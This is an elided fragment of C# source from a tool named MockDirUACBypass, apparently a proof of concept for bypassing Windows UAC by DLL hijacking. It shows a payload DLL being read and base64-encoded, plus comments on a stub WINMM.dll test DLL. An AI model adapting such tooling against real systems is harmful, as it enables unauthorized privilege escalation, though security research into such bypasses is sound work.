...
namespace MockDirUACBypass
{
    class MainClass
    {
        ...
        public static void Main(string[] args)
        {
            ...
            string payloadDllB64 = Convert.ToBase64String(File.ReadAllBytes(args[0]));

            // If you'd like to test, here's a DLL that exports the functions required from WINMM.dll as stubs.
            // It will pop a message box with a bool indicating IL. Thanks @dwells for helping me test this.
